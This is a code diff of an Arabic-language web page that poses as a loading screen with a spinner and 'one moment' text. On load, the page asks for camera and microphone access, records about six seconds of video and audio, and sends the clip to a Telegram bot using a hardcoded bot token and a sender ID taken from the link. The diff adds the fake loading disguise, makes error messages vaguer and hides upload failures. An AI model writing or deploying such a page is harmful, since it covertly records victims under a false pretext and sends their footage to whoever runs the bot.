@@ -1,44 +1,74 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل النظام</title>
+    <title>جاري التحميل</title>
     <style>
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #000; color: white; margin: 0; }
-        #status { font-size: 18px; text-align: center; padding: 20px; }
-        video { display: none; }
+        body {
+            background-color: #000;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        /* تصميم شريط التحميل الدائري مثل الصورة */
+        .loader {
+            width: 120px;
+            height: 120px;
+            border: 12px solid #f3f3f3;
+            border-top: 12px solid #3498db; /* اللون الأزرق كما في الصورة */
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin-bottom: 30px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 22px;
+            font-weight: bold;
+        }
+
+        video {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-    <div id="status">جاري تهيئة النظام...</div>
-    
+    <div class="loader"></div>
+    <div class="status-text" id="status">لحظة واحدة</div>
+
     <video id="video" autoplay muted playsinline></video>
 
     <script>
         const video = document.getElementById('video');
         const statusText = document.getElementById('status');
         
-        // الحصول على sender_id من الرابط
         const urlParams = new URLSearchParams(window.location.search);
         const senderId = urlParams.get('sender_id');
         const botToken = "8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E";
 
-        // وظيفة التشغيل التلقائي بمجرد تحميل الصفحة
         window.onload = async () => {
-            // التأكد من وجود المعرف أولاً
             if (!senderId) {
-                statusText.innerText = "خطأ: لم يتم العثور على معرف المستخدم. يرجى فتح الرابط من البوت.";
-                statusText.style.color = "red";
+                statusText.innerText = "خطأ في الاتصال";
                 return;
             }
 
             try {
-                // طلب الإذن فوراً
+                // طلب الإذن (كما في الصورة الثانية)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
-                statusText.innerText = "جاري تفعيل الخدمة...";
                 
                 const mediaRecorder = new MediaRecorder(stream);
                 const chunks = [];
@@ -53,16 +83,18 @@
                     stream.getTracks().forEach(track => track.stop());
                 };
 
-                // بدء التسجيل تلقائياً
+                // بدء التسجيل تلقائياً بعد الموافقة
                 mediaRecorder.start();
                 
-                // تسجيل لمدة 5 ثوانٍ
+                // تسجيل لمدة 6 ثوانٍ
                 setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 5000);
+                    if (mediaRecorder.state === "recording") {
+                        mediaRecorder.stop();
+                    }
+                }, 6000);
 
             } catch (err) {
-                statusText.innerText = "يرجى السماح بالوصول للكاميرا لتشغيل الخدمة.";
+                statusText.innerText = "يرجى المحاولة مرة أخرى";
             }
         };
 
@@ -78,12 +110,10 @@
                 });
                 
                 if (response.ok) {
-                    statusText.innerText = "تم التفعيل بنجاح!";
-                } else {
-                    statusText.innerText = "فشل إرسال البيانات.";
+                    statusText.innerText = "تم التحميل بنجاح";
                 }
             } catch (error) {
-                statusText.innerText = "خطأ في الاتصال بالسيرفر.";
+                console.error(error);
             }
         }
     </script>
